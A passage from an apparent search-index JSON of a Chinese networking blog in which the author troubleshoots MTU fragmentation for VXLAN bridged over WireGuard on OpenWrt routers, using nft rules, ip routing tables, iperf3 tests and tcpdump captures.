wireshark \u4e2d\u524d\u4e24\u4e2a\u5305\u7684\u5927\u5c0f\u3002\u5bf9\u4e8e\u53e6\u4e00\u4e2a 578 \u7684\u5305\u5219\u4e0d\u7528\u5206\u7247\uff0c\u6dfb\u52a0 ip header \u540e\u5c31\u662f 598\u3002</p> <p>\u53ef\u4ee5\u770b\u5230 wireshark \u505a\u4e86\u5f88\u591a\u5904\u7406\u3002\u7531\u4e8e vxlan \u6ca1\u6709\u52a0\u5bc6\uff0c\u56e0\u6b64 wireshark \u76f4\u63a5\u5c55\u793a\u4e86 vxlan \u5185\u7684\u5185\u5bb9\u3002\u5bf9\u4e8e\u7b2c\u4e00\u4e2a\u5305\uff0c\u53ea\u663e\u793a\u4e86\u662f ip fragment\uff0c\u6e90\u5730\u5740\u540e\u76ee\u7684\u5730\u5740\u4e5f\u90fd\u662f 10.0.31\u3002\u800c\u6536\u5230\u7b2c\u4e8c\u4e2a\u5305\u540e\uff0c\u7531\u4e8e\u5df2\u7ecf\u53ef\u4ee5\u548c\u7b2c\u4e00\u4e2a\u91cd\u7ec4\u6210\u4e00\u4e2a\u5b8c\u6574\u7684 ip \u5305\u4e86\uff08\u5e94\u8be5\u8bf4\u662f\u7ecf\u8fc7 vxlan \u5305\u88c5\u540e\u7684 ip \u5305\uff09\uff0c\u56e0\u6b64\u663e\u793a\u4e86 \u5185\u90e8\u7684\u5730\u5740 192.168.35\u3002\u7b49\u6536\u5230\u7b2c\u4e09\u4e2a\u5305\u65f6\uff0c\u5185\u90e8\u7684 ip \u5305\u4e5f\u80fd\u591f\u91cd\u7ec4\u4e86\uff0c\u56e0\u6b64\u663e\u793a\u4e86\u6700\u7ec8\u7684 icmp \u4fe1\u606f\u3002</p> <p>\u4ee5\u4e0b\u663e\u793a\u4e86\u8fd9\u79cd\u5c42\u5c42\u5d4c\u5957\u7684\u5173\u7cfb </p> <p>\u4e3a\u4ec0\u4e48 reply \u53ea\u6709\u4e24\u4e2a\u5305\u5462\u3002\u56e0\u6b64 op1 \u4e0a vxlan \u5bf9\u5e94\u7684\u63a5\u53e3 MTU \u5df2\u7ecf\u88ab\u8bbe\u7f6e\u6210\u4e86 1370\uff0c\u56e0\u6b64\u8fd4\u56de\u65f6\u5bf9\u4e8e 2008B \u7684\u5305\u4f1a\u6309\u7167 1370 \u8fdb\u884c\u5206\u7247\uff0c\u5206\u6210\u4e24\u4e2a\u5305\u3002\u8fd9\u4e24\u4e2a\u5305\u52a0\u4e0a vxlan \u5f00\u9500\u540e\u5bf9\u4e8e wg0 \u90fd\u4e0d\u4f1a\u8d85\u8fc7 MTU \u5927\u5c0f\uff0c\u56e0\u6b64\u4e0d\u4f1a\u4ea7\u751f\u66f4\u591a\u5206\u7247\uff0c\u56e0\u6b64\u53ea\u6709\u4e24\u4e2a\u5305\u3002</p> <p>\u53ef\u80fd\u4f1a\u53d1\u73b0 reply \u5305\u7684 ip \u5c42\u5927\u5c0f\u5e76\u4e0d\u662f 1420\uff0c\u800c\u662f 1414\u3002\u8fd9\u662f\u56e0\u4e3a\u4e0a\u5c42\u6309\u7167 MTU=1370 \u5206\u7247\u65f6\uff0cip \u8d1f\u8f7d\u90e8\u5206\u9700\u8981\u662f 8 \u7684\u500d\u6570\uff0c\u56e0\u6b64\u4e0d\u662f 1350 \u800c\u662f 1344\uff0c\u5982\u56fe\u4e2d\u7ea2\u6846\u5708\u8d77\u90e8\u5206\u3002\u8fd9\u5bfc\u81f4\u52a0\u4e0a vxlan \u5f00\u9500\u540e\u5c31\u662f 1344 + 20 + 50 = 1414 \u4e86</p> <p></p>","tags":["vxlan","openwrt","glinet","jcg_q30"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/04/21/%E4%BE%BF%E6%90%BA%E8%B7%AF%E7%94%B1%E5%99%A8/#\u989d\u5916\u5206\u7247\u6d4b\u901f","title":"\u989d\u5916\u5206\u7247\u6d4b\u901f","text":"<p>\u770b\u770b L2 \u989d\u5916\u5206\u7247\u5bfc\u81f4\u7684\u6027\u80fd\u5f71\u54cd\uff0c\u4f7f\u7528 iperf3 \u8fdb\u884c\u6d4b\u901f\u3002\u6d4b\u8bd5 jcg_q30p \u548c op1 \u95f4\u901a\u8fc7 wg \u548c vxlan \u65f6\u7684\u901f\u5ea6\u3002</p> vxlan wg up 350 500 down 400 470 \u53ef\u4ee5\u770b\u5230\u989d\u5916\u7684\u5206\u7247\u786e\u5b9e\u9020\u6210\u4e86\u4e00\u5b9a\u7684\u6027\u80fd\u5f71\u54cd\u3002\u4e3b\u8981\u5728\u4e8e jcg_q30p \u4e0a\u4f20\u65f6\uff08jcg_q30p \u8d1f\u8d23\u5206\u7247\uff09\u3002\u4e0b\u8f7d\u5f71\u54cd\u8f83\u5c0f\u3002","tags":["vxlan","openwrt","glinet","jcg_q30"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/04/21/%E4%BE%BF%E6%90%BA%E8%B7%AF%E7%94%B1%E5%99%A8/#\u9047\u5230\u7684\u95ee\u9898","title":"\u9047\u5230\u7684\u95ee\u9898","text":"","tags":["vxlan","openwrt","glinet","jcg_q30"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/04/21/%E4%BE%BF%E6%90%BA%E8%B7%AF%E7%94%B1%E5%99%A8/#nft-\u547d\u4ee4\u62a5\u9519","title":"nft \u547d\u4ee4\u62a5\u9519","text":"<p>\u62a5\u9519\uff0c\u4f46\u662f\u540c\u6837\u7684\u547d\u4ee4 x86 \u4e0a\u7684 openwrt \u53c8\u6ca1\u6709\u95ee\u9898\u3002</p> <pre><code>root@JCG_Q30P \u279c  ~ nft list table bridge fix_mtu\ntable bridge fix_mtu {\n        chain c1 {\n                type filter hook prerouting priority dstnat - 1; policy accept;\n        }\n}\nroot@JCG_Q30P \u279c  ~ nft add rule bridge fix_mtu c1 meta iifname vxlan0 ip daddr 192.168.35.0/24 meta pkttype set host ether daddr set 9e:65:fa:e5:bb:c0 counter\nError: Could not process rule: No such file or directory\nadd rule bridge fix_mtu c1 meta iifname vxlan0 ip daddr 192.168.35.0/24 meta pkttype set host ether daddr set 9e:65:fa:e5:bb:c0 counter\n                           ^^^^^^^^^^^^\nroot@JCG_Q30P \u279c  ~ nft add rule bridge fix_mtu c1 ip daddr 192.168.35.0/24 meta pkttype set host ether daddr set 9e:65:fa:e5:bb:c0 counter\nError: Could not process rule: No such file or directory\nadd rule bridge fix_mtu c1 ip daddr 192.168.35.0/24 meta pkttype set host ether daddr set 9e:65:fa:e5:bb:c0 counter\n                           ^^^^^^^^\nroot@JCG_Q30P \u279c  ~ nft add rule bridge fix_mtu c1 meta pkttype set host ether daddr set 9e:65:fa:e5:bb:c0 counter\nError: Could not process rule: No such file or directory\nadd rule bridge fix_mtu c1 meta pkttype set host ether daddr set 9e:65:fa:e5:bb:c0 counter\n</code></pre> <p>\u53ef\u80fd\u662f\u6ca1\u6709\u5f00\u542f\u76f8\u5173\u5185\u6838\u9009\u9879\uff1alinux - nftables rule: No such file or directory error - Unix &amp; Linux Stack Exchange</p> <p>\u4e5f\u4e0d\u77e5\u9053\u5982\u4f55\u67e5\u770b\u5f00\u4e86\u54ea\u4e9b\u5185\u6838\u9009\u9879\uff1aObtain kernel config from currently running OpenWrt system - Installing and Using OpenWrt - OpenWrt Forum</p> <p>\u5f85\u89e3\u51b3</p>","tags":["vxlan","openwrt","glinet","jcg_q30"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/04/21/%E4%BE%BF%E6%90%BA%E8%B7%AF%E7%94%B1%E5%99%A8/#\u89e3\u51b3-mtu-\u95ee\u9898\u603b\u7ed3","title":"\u89e3\u51b3 MTU \u95ee\u9898\u603b\u7ed3","text":"","tags":["vxlan","openwrt","glinet","jcg_q30"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/04/21/%E4%BE%BF%E6%90%BA%E8%B7%AF%E7%94%B1%E5%99%A8/#\u65b9\u6848\u5bf9\u6bd4","title":"\u65b9\u6848\u5bf9\u6bd4","text":"<p>MTU \u95ee\u9898\uff1a\u672c\u5730\u8def\u7531\u5668\u901a\u8fc7 vxlan \u4e8c\u5c42\u96a7\u9053\u8fde\u63a5\u5230\u4e3b\u8def\u7531\u5668 op1\uff0c\u5e76\u5c06 vxlan \u63a5\u53e3\u6865\u63a5\u5230\u4ee5\u592a\u7f51\u53e3\u548c\u65e0\u7ebf\uff0c\u4ece\u800c\u8ba9\u624b\u673a\u3001\u7b14\u8bb0\u672c\u7b49\u8bbe\u5907\u4e5f\u8fde\u5165 op1 \u7684\u4e8c\u5c42\u7f51\u7edc\u3002\u7136\u800c\uff0c\u7531\u4e8e\u539f\u672c op1 \u7684\u4e8c\u5c42 MTU \u662f 1500\uff0c\u800c\u901a\u8fc7\u96a7\u9053\u7684\u94fe\u8def\u53ea\u6709 1370\uff08wg 1420 - vxlan 50\uff09\uff0c\u56e0\u6b64 op1 \u7684\u4e8c\u5c42\u51fa\u73b0\u4e86\u4e0d\u540c MTU \u7684\u90e8\u5206\u3002</p> <p>\u89e3\u51b3\u529e\u6cd5\u6709\u4e24\u79cd</p> <ul> <li>bridge \u8f6c routing\u3002\u672c\u5730\u8def\u7531\u5668\u8f6c\u53d1\u4e00\u6b21\uff0c\u5bf9 ip \u62a5\u6587\u5206\u7247\u3002\u5229\u7528 nftable bridge \u547d\u4ee4\uff0c\u4fee\u6539\u5305\u7684\u76ee\u7684 mac \u5730\u5740\u4e3a\u672c\u5730\u8def\u7531\u5668\uff0c\u8fd9\u6837\u672c\u5730\u8def\u7531\u5668\u63a5\u6536\u5230\u5305\u540e\u4f1a\u8f6c\u53d1\u8be5\u5305\uff0c\u8fc7\u7a0b\u548c\u666e\u901a\u7684\u8f6c\u53d1\u5305\u6ca1\u6709\u533a\u522b\u3002\u8be5\u64cd\u4f5c\u548c\u4f7f\u7528 ARP Proxy \u6765\u8def\u7531\u4e0d\u540c VLAN \u95f4\u7684 IP \u5305\u8bbe\u5907\u539f\u7406\u7c7b\u4f3c\u3002<ul> <li>\u4f18\u70b9<ul> <li>\u5bf9\u901f\u5ea6\u5f71\u54cd\u8f83\u5c0f\u3002\u591a\u4e00\u8df3\u8def\u7531\u540e\uff0cMSS clamping \u53ef\u4ee5\u6b63\u5e38\u5de5\u4f5c\uff0c\u56e0\u6b64\u53ef\u4ee5\u907f\u514d TCP \u7684\u975e\u5fc5\u8981\u5206\u7247</li> </ul> </li> <li>\u7f3a\u70b9<ul> <li>\u9700\u8981\u8bbe\u7f6e nft \u547d\u4ee4\uff0c\u4e00\u70b9\u70b9\u590d\u6742</li> <li>\u62c9\u4f4e\u4e86 op1 \u7684 br-lan \u7684 MTU\uff0c\u9700\u8981\u8bbe\u7f6e\u6210\u548c vxlan \u4e00\u81f4</li> </ul> </li> <li>lan2 \u8bbe\u7f6e\uff1a\u8bbe\u7f6e\u6210 dhcp client \u6bd4\u8f83\u597d\uff0c\u56e0\u4e3a\u8f6c\u53d1\u9700\u8981\u6709\u8def\u7531\u3002lan2 \u6709 ip \u5730\u5740\uff0c\u4f1a\u81ea\u52a8\u8bbe\u7f6e\u8def\u7531</li> </ul> </li> <li>\u4e8c\u5c42\u5957\u4e09\u5c42\u3002\u5728 wg \u4e0a\u521b\u5efa vxlan\uff0cwg \u4f1a\u81ea\u52a8\u5c06\u8d85\u8fc7\u7406\u8bba MTU \u7684\u5305\u6309\u7167 wg \u63a5\u53e3 MTU \u5206\u7247<ul> <li>\u4f18\u70b9<ul> <li>just work\uff0c\u4e0d\u4f1a\u9047\u5230 MTU \u95ee\u9898</li> </ul> </li> <li>\u7f3a\u70b9<ul> <li>\u6ca1\u6709 MSS \u529f\u80fd\uff0c\u8def\u7531\u5668\u4e0a\u65e0\u6cd5\u907f\u514d\u5206\u7247\u3002\u5206\u7247\u6709\u989d\u5916\u6027\u80fd\u5f00\u9500</li> </ul> </li> <li>lan2 \u8bbe\u7f6e\uff1a\u8bbe\u7f6e\u6210 umanaged \u5373\u53ef</li> </ul> </li> </ul>","tags":["vxlan","openwrt","glinet","jcg_q30"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/04/21/%E4%BE%BF%E6%90%BA%E8%B7%AF%E7%94%B1%E5%99%A8/#20250217-x86-\u4e24\u5c42\u5957\u4e09\u5c42\u4e0d\u81ea\u52a8\u5206\u7247","title":"2025/02/17 x86 \u4e24\u5c42\u5957\u4e09\u5c42\u4e0d\u81ea\u52a8\u5206\u7247","text":"<p>\u5728 op1 \u548c op2 \u5c1d\u8bd5\u4e24\u5c42\u5957\u4e09\u5c42\u65b9\u6848\uff0c\u53d1\u73b0 ping \u4e0d\u901a\u5927\u5305\uff0c\u5728 op2 \u4e0a\u6293\u5305\uff0c\u53d1\u73b0\u5e95\u5c42 wg_s2s \u6216\u8005 ipip \u5747\u4e0d\u81ea\u52a8\u5206\u7247\u3002</p> <p>p.s vxlan \u6bd4\u8f83\u5751\u7684\u4e00\u70b9\u662f\uff0c\u5e95\u5c42\u5207\u6362\u4e86 peer \u4f7f\u7528\u7684 ip \u540e\uff0c\u91cd\u542f\u63a5\u53e3\u4ecd\u7136\u8fd8\u662f\u4f7f\u7528\u539f\u672c\u7684 ip \u5efa\u7acb vxlan \u8fde\u63a5\u3002\u5bfc\u81f4\u6211\u65e0\u6cd5\u5feb\u901f\u5207\u6362\u5e95\u5c42\u7684 wg \u548c ipip\u3002\u89e3\u51b3\u529e\u6cd5\u4e3a service network restart\u3002</p> <ul> <li>\u4f46\u662f vr \u4e32\u6d41\u6ca1\u95ee\u9898\uff0cmoonlight \u4e5f\u6ca1\u6709\u95ee\u9898\uff08\u5747\u662f udp \u7684\uff09</li> <li>iperf3 udp \u6d4b\u8bd5\u65e0\u6cd5\u8fdb\u884c\uff0ctcp \u53ef\u4ee5\u3002\u4f7f\u7528 wireshark \u6293\u5305\u53d1\u73b0 tcp \u65f6 MSS \u8bbe\u7f6e\u7684\u5f88\u5c0f\uff0c\u4e0d\u4f1a\u8d85\u8fc7\u8def\u5f84 MTU\u3002</li> </ul> <p>\u4e0a\u8ff0\u95ee\u9898\u5bb9\u6613\u590d\u73b0\uff0c\u76ee\u524d\u89e3\u51b3\u529e\u6cd5\u4e3a\u4f7f\u7528\u539f\u672c\u7684 bridge \u8f6c routing \u65b9\u6848\u3002</p> <p>\u786c\u8def\u7531\u660e\u660e\u6ca1\u95ee\u9898\uff0c\u533a\u522b\u5728\u4e8e\u8fd9\u4e2a\u662f x86 \u8f6f\u8def\u7531\u3002</p> <p>TODO\uff1a\u8fdb\u4e00\u6b65\u7814\u7a76\u539f\u56e0</p>","tags":["vxlan","openwrt","glinet","jcg_q30"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/04/21/%E4%BE%BF%E6%90%BA%E8%B7%AF%E7%94%B1%E5%99%A8/#\u5e95\u5c42-wg-\u65b9\u6848\u6ce8\u610f","title":"\u5e95\u5c42 wg \u65b9\u6848\u6ce8\u610f","text":"<p>\u63a8\u8350\u8bbe\u7f6e\u4e3a umanaged\uff0c\u8fd9\u6837\u5bf9\u539f\u672c\u8def\u7531\u6ca1\u6709\u5f71\u54cd\u3002\u800c\u8fde\u63a5 lan2 \u7684\u8bbe\u5907\u6d41\u91cf\u4e00\u5b9a\u4f1a\u901a\u8fc7 vxlan \u53d1\u9001\u51fa\u53bb\u3002</p> <p>\u5982\u679c\u8981\u8bbe\u7f6e\u4e3a dhcp client</p> <ul> <li>lan2 \u8bb0\u4f4f\u52fe\u9009 no default router\uff0c\u5426\u5219\u9ed8\u8ba4\u8def\u7531\u53d8\u4e3a\u8d70 lan2 \u800c\u4e0d\u662f wan\u3002</li> <li>\u6dfb\u52a0 ip rule \u4f7f\u5f97 src lan1 \u5230 lan2 \u7684\u8d70 wg \u63a5\u53e3\uff0c\u5426\u5219\u4f1a\u8d70 main \u4e2d lan2 /24 \u7684\u8def\u7531   <pre><code># ip ru\n3:      from 192.168.36.0/24 lookup lan\n\n# ip table show lan\n192.168.35.0/24 dev wg_s2s proto static scope link\n\n# ip ro\n192.168.35.0/24 dev br-lan2 proto kernel scope link src 192.168.35.169\n</code></pre></li> </ul> <p>\u6b64\u65f6 lan1 \u8bbf\u95ee lan2 \u8d70 wg \u63a5\u53e3\u3002lan2 \u8bbf\u95ee lan2 \u76f4\u63a5\u901a\u8fc7 vxlan \u63a5\u53e3\u3002</p>","tags":["vxlan","openwrt","glinet","jcg_q30"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/04/21/%E4%BE%BF%E6%90%BA%E8%B7%AF%E7%94%B1%E5%99%A8/#bridge-\u8f6c-routing-\u65b9\u6848\u6ce8\u610f","title":"bridge \u8f6c routing \u65b9\u6848\u6ce8\u610f","text":"<p>\u672c\u8d28\u5df2\u7ecf\u53d8\u6210\u8def\u7531\u4e86\uff0c\u6240\u4ee5\u6765\u56de\u751a\u81f3\u53ef\u4ee5\u4e0d\u8d70 vxlan\u3002\uff08\u4f46\u662f\u786e\u5b9e\u89e3\u51b3\u4e86\u5c40\u57df\u7f51\u53d1\u73b0\u8bbe\u5907\u7684\u95ee\u9898\uff09</p> <p>\u9700\u8981\u8bbe\u7f6e\u4e3a dhcp client\uff0c\u5426\u5219 br-lan2 \u6ca1\u6709 ip\uff0c\u65e0\u6cd5\u8def\u7531 lan2 \u6d41\u91cf\u3002</p> <ul> <li>\u540c\u6837 lan2 \u8bb0\u4f4f\u52fe\u9009 no default router\uff0c\u5426\u5219\u9ed8\u8ba4\u8def\u7531\u53d8\u4e3a\u8d70 lan2 \u800c\u4e0d\u662f wan\u3002</li> <li>\u672a\u5fc5\u9700\u8981\u8d70 vxlan\uff0c\u5982\u4e0b\u53bb\u65f6\u8d70\u4e86 wg_s2s\uff0c\u56de\u65f6\u8d70 vxlan\uff0c\u4e5f\u6ca1\u6709\u95ee\u9898\u3002\u53ef\u4ee5\u6839\u636e\u9700\u6c42\uff08\u6bd4\u5982\u96a7\u9053\u7684\u5ef6\u8fdf\u3001\u5e26\u5bbd\uff09\u5207\u6362\u4e0d\u540c\u8def\u7531\u3002</li> </ul> <pre><code>root@op2 \u279c  ~ tcpdump -ni any icmp and host 192.168.35.1\ntcpdump: data link type LINUX_SLL2\ntcpdump: verbose output suppressed, use -v[v]... for full protocol decode\nlistening on any, link-type LINUX_SLL2 (Linux cooked v2), snapshot length 262144 bytes\n00:06:58.678431 eth2  P   IP 192.168.35.180 &gt; 192.168.35.1: ICMP echo request, id 1, seq 3550, length 1480\n00:06:58.678432 eth2  P   IP 192.168.35.180 &gt; 192.168.35.1: ip-proto-1\n00:06:58.678432 br-lan2 In  IP 192.168.35.180 &gt; 192.168.35.1: ICMP echo request, id 1, seq 3550, length 2008\n00:06:58.678500 wg_s2s Out IP 192.168.35.180 &gt; 192.168.35.1: ICMP echo request, id 1, seq 3550, length 1336\n00:06:58.678811 wg_s2s Out IP 192.168.35.180 &gt; 192.168.35.1: ip-proto-1\n00:06:58.690066 vxlan0 P   IP 192.168.35.1 &gt; 192.168.35.180: ICMP echo reply, id 1, seq 3550, length 1288\n00:06:58.690114 vxlan0 P   IP 192.168.35.1 &gt; 192.168.35.180: ip-proto-1\n00:06:58.690135 eth2  Out IP 192.168.35.1 &gt; 192.168.35.180: ICMP echo reply, id 1, seq 3550, length 1288\n00:06:58.690137 eth2  Out IP 192.168.35.1 &gt; 192.168.35.180: ip-proto-1\n</code></pre> <pre><code>root@op2 \u279c  ~ ip ru\n0:      from all lookup local\n999:    from all lookup oversea\n1009:   from all lookup mynet_lugvpn\n1010:   from all lookup mynet_wg\n32766:  from all lookup main\n32767:  from all lookup default\nroot@op2 \u279c  ~ ipt mynet_wg\n192.168.35.0/24 dev wg_s2s proto static scope link\n</code></pre> <p>\u4e0d\u901a <pre><code>root@op2 \u279c  ~ tcpdump -ni any icmp and host 192.168.35.1\ntcpdump: data link type LINUX_SLL2\ntcpdump: verbose output suppressed, use -v[v]... for full protocol decode\nlistening on any, link-type LINUX_SLL2 (Linux cooked v2), snapshot length 262144 bytes\n00:42:12.035625 eth2  P   IP 192.168.35.180 &gt; 192.168.35.1: ICMP echo request, id 1, seq 5527, length 1480\n00:42:12.035627 eth2  P   IP 192.168.35.180 &gt; 192.168.35.1: ip-proto-1\n00:42:12.035627 br-lan2 In  IP 192.168.35.180 &gt; 192.168.35.1: ICMP echo request, id 1, seq 5527, length 2008\n00:42:12.035698 ipip-s2s_ipip Out IP 10.99.1.2 &gt; 192.168.35.1: ICMP echo request, id 1, seq 5527, length 1256\n00:42:12.035719 ipip-s2s_ipip Out IP 10.99.1.2 &gt; 192.168.35.1: ip-proto-1\n00:42:12.044109 ipip-s2s_ipip In  IP 192.168.35.1 &gt; 10.99.1.2: ICMP echo reply, id 1, seq 5527, length 1256\n00:42:12.044109 ipip-s2s_ipip In  IP 192.168.35.1 &gt; 10.99.1.2: ip-proto-1\n00:42:12.044149 ipip-s2s_ipip Out IP 192.168.35.1 &gt; 192.168.35.180: ICMP echo reply, id 1, seq 5527, length 1256\n00:42:12.044163 ipip-s2s_ipip Out IP 192.168.35.1 &gt; 192.168.35.180: ip-proto-1\n</code></pre></p> <p>\u901a\uff0c\u4f46\u662f\u9006\u5929 <pre><code>root@op2 \u279c  ~ tcpdump -ni any icmp and host 192.168.35.2\ntcpdump: data link type LINUX_SLL2\ntcpdump: verbose output suppressed, use -v[v]... for full protocol decode\nlistening on any, link-type LINUX_SLL2 (Linux cooked v2), snapshot length 262144 bytes\n00:43:46.715022 eth2  P   IP 192.168.35.180 &gt; 192.168.35.2: ICMP echo request, id 1, seq 5546, length 1256\n00:43:46.715023 eth2  P   IP 192.168.35.180 &gt; 192.168.35.2: ip-proto-1\n00:43:46.715023 br-lan2 In  IP 192.168.35.180 &gt; 192.168.35.2: ICMP echo request, id 1, seq 5546, length 2008\n00:43:46.715109 ipip-s2s_ipip Out IP 10.99.1.2 &gt; 192.168.35.2: ICMP echo request, id 1, seq 5546, length 1256\n00:43:46.715128 ipip-s2s_ipip Out IP 10.99.1.2 &gt; 192.168.35.2: ip-proto-1\n00:43:46.724325 ipip-s2s_ipip In  IP 192.168.35.2 &gt; 10.99.1.2: ICMP echo reply, id 1, seq 5546, length 1256\n00:43:46.724325 ipip-s2s_ipip In  IP 192.168.35.2 &gt; 10.99.1.2: ip-proto-1\n00:43:46.724390 ipip-s2s_ipip Out IP 192.168.35.2 &gt; 192.168.35.180: ICMP echo reply, id 1, seq 5546, length 1256\n00:43:46.724404 ipip-s2s_ipip Out IP 192.168.35.2 &gt; 192.168.35.180: ip-proto-1\n00:43:46.733108 vxlan0 P   IP 192.168.35.2 &gt; 192.168.35.180: ICMP echo reply, id 1, seq 5546, length 1256\n00:43:46.733181 vxlan0 P   IP 192.168.35.2 &gt; 192.168.35.180: ip-proto-1\n00:43:46.733217 eth2  Out IP 192.168.35.2 &gt; 192.168.35.180: ICMP echo reply, id 1, seq 5546, length 1256\n00:43:46.733220 eth2  Out IP 192.168.35.2 &gt; 192.168.35.180: ip-proto-1\n</code></pre></p>","tags":["vxlan","openwrt","glinet","jcg_q30"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/04/21/%E4%BE%BF%E6%90%BA%E8%B7%AF%E7%94%B1%E5%99%A8/#bridge-\u8f6c-routing-\u4e8c\u5c42\u6293\u5305\u5206\u6790","title":"bridge \u8f6c routing \u4e8c\u5c42\u6293\u5305\u5206\u6790","text":"<p>\u4e4b\u524d\u300aMTU\u7684\u90a3\u4e9b\u5751(\u4e8c\u5c42\u96a7\u9053\u7ec4\u7f51)\u300b \u535a\u5ba2\u6ca1\u6709\u4ece\u4e8c\u5c42\u8fdb\u884c\u6293\u5305\u5206\u6790\uff0c\u8fd9\u91cc\u8fdb\u4e00\u6b65\u5206\u6790 bridge \u8f6c routing \u65b9\u6cd5\u7684\u539f\u7406\u3002</p> <p>\u6d89\u53ca\u7684\u63a5\u53e3\uff1a</p> <ul> <li>vxlan0\uff1avxlan \u63a5\u53e3</li> <li>eth2\uff1a\u7528\u4e8e\u8fde\u63a5\u5b9e\u9645\u7269\u7406\u8bbe\u5907\uff0c\u5982\u65e0\u7ebf AP\u3002</li> <li>br-lan2\uff1a\u5c06\u524d\u4e24\u8005\u6865\u63a5\u5728\u4e00\u8d77</li> </ul> <p>n5105 \u8fde\u63a5\u4e86 op2 eth2\uff0c\u5730\u5740\u4e3a 192.168.35.183\uff0cping 192.158.35.1 (op1) \u65f6\u7684\u6293\u5305\u7ed3\u679c\u5982\u4e0b\u3002</p> <ul> <li>\u5305\u4ece eth2 \u8fdb\u5165\uff0c\u6e90 mac \u4e3a n5105\uff087e10\uff09\uff0c\u76ee\u7684 mac \u5730\u5740\u4e3a op1\uff086780\uff09\uff08\u89c1 tcpdump eth2\uff09\u3002\u7b26\u5408\u5c40\u57df\u7f51\u76f4\u63a5\u53d1\u9001\u7684\u60c5\u51b5\u3002</li> <li>\u5230\u8fbe br-lan2 \u65f6\uff0c\u7531\u4e8e nft \u89c4\u5219\uff0c\u76ee\u7684 mac \u88ab\u4fee\u6539\u6210\u4e86 op2 br-lan2 \u7684 mac \u5730\u5740\uff089053)\uff08\u89c1 tcpdump br-lan2\uff09</li> <li>op2 \u63a5\u6536\u8be5\u5305\uff0c\u53d1\u73b0\u4e0d\u662f\u7ed9\u81ea\u5df1\u7684\uff0c\u4e8e\u662f\u8fdb\u5165 forward \u6d41\u7a0b\u3002</li> <li>op2 \u53d1\u73b0 op1 \u4f4d\u4e8e\u81ea\u5df1 br-lan2 \u63a5\u53e3\u7684\u7f51\u6bb5\uff0c\u4e0d\u9700\u8981\u8def\u7531\uff0c\u4e8e\u662f\u76f4\u63a5\u53d1\u9001\uff0c\u4ea7\u751f\u4e00\u4e2a\u76ee\u7684 mac \u4e3a op1 \u7684\u5305\u3002</li> <li>\u5305\u6700\u540e\u4ece vxlan0 \u53d1\u51fa\u53bb\u3002</li> <li>op1 \u63a5\u6536\u5230\u5305\uff0c\u4ea7\u751f reply\u3002\u7531\u4e8e\u662f\u4e00\u4e2a\u7f51\u6bb5\uff0c\u56e0\u6b64\u76f4\u63a5\u53d1\u9001\uff0c\u6e90 mac \u4e3a op1\uff0c\u76ee\u7684 mac \u5730\u5740\u4e3a n5105\u3002</li> </ul> <p></p> <p>\u5206\u7247\u60c5\u51b5\u4e0b\u7684\u4e0a\u8ff0\u5b9e\u9a8c(n5105 ping -s 2000 op1)</p> <ul> <li>eth2 \u5230 br-lan2 \u65f6\uff0c\u9664\u4e86\u6539\u53d8\u76ee\u7684 mac \u5730\u5740\uff0c\u8fd8\u5bf9\u5206\u7247\u8fdb\u884c\u4e86\u5408\u5e76\u3002</li> <li>\u5408\u5e76\u540e\uff0cop2 \u8f6c\u53d1\u65f6\u518d\u6b21\u8fdb\u884c\u5206\u7247\u3002</li> </ul> <p></p> <p>\u8fd9\u662f\uff0cop2 \u4e0b lan35 \u8bbe\u5907\u8bbf\u95ee op1 \u4e0b lan35 \u8bbe\u5907\u65f6\u3002\u4e24\u8fb9\u90fd\u5bf9 mac \u5730\u5740\u8fdb\u884c\u4fee\u6539\u7684\u4f8b\u5b50\u3002 </p> <p>MSS</p> <p>\u7b80\u5355\u6765\u8bf4\u5c31\u662f\u4ece\u54ea\u4e2a\u63a5\u53e3\u51fa\u53bb\uff0cMSS \u5c31\u4f1a\u88ab\u8bbe\u7f6e\u6210\u8be5\u63a5\u53e3\u7684 MTU - 40\u3002</p> <pre><code>root@op2 \u279c  ~ tcpdump -ni any tcp and 'tcp[tcpflags] &amp; tcp-syn != 0'\ntcpdump: data link type LINUX_SLL2\ntcpdump: verbose output suppressed, use -v[v]... for full protocol decode\nlistening on any, link-type LINUX_SLL2 (Linux cooked v2), snapshot length 262144 bytes\n18:59:28.263559 eth1  In  IP 192.168.36.215.31229 &gt; 192.168.35.2.2202: Flags [S], seq 772932793, win 64240, options [mss 1460,nop,wscale 8,nop,nop,sackOK], length 0\n18:59:28.263617 wg_s2s Out IP 192.168.36.215.31229 &gt; 192.168.35.2.2202: Flags [S], seq 772932793, win 64240, options [mss 1372,nop,wscale 8,nop,nop,sackOK], length 0\n18:59:28.266696 wg_s2s In  IP 192.168.35.2.2202 &gt; 192.168.36.215.31229: Flags [S.], seq 1164402249, ack 772932794, win 64240, options [mss 1330,nop,nop,sackOK,nop,wscale 7], length 0\n18:59:28.266725 eth1  Out IP 192.168.35.2.2202 &gt; 192.168.36.215.31229: Flags [S.], seq 1164402249, ack 772932794, win 64240, options [mss 1330,nop,nop,sackOK,nop,wscale 7], length 0\n</code></pre> <pre><code>root@op1 \u279c  ~ tcpdump -ni any tcp and 'tcp[tcpflags] &amp; tcp-syn != 0' and host 192.168.35.2\ntcpdump: data link type LINUX_SLL2\ntcpdump: verbose output suppressed, use -v[v]... for full protocol decode\nlistening on any, link-type LINUX_SLL2 (Linux cooked v2), snapshot length 262144 bytes\n19:00:17.590135 wg_s2s In  IP 192.168.36.215.31245 &gt; 192.168.35.2.2202: Flags [S], seq 3691553873, win 64240, options [mss 1372,nop,wscale 8,nop,nop,sackOK], length 0\n19:00:17.590161 br-lan Out IP 192.168.36.215.31245 &gt; 192.168.35.2.2202: Flags [S], seq 3691553873, win 64240, options [mss 1330,nop,wscale 8,nop,nop,sackOK], length 0\n19:00:17.590163 eth1  Out IP 192.168.36.215.31245 &gt; 192.168.35.2.2202: Flags [S], seq 3691553873, win 64240, options [mss 1330,nop,wscale 